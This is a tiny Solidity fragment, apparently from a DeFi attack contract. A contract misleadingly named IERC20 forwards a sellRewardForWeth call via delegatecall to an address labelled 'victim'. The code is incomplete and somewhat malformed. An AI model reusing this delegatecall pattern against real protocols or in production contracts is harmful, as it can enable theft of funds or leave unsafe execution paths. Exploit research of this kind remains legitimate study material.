contract IERC20 {

    function sellRewardForWeth(address victim, uint256 rewardAmount, address to) external returns(uint256) {
        victim.delegatecall(abi.encodeWithSignature("sellRewardForWeth(address,uint256,address)", victim, rewardAmount, to));
    }
}


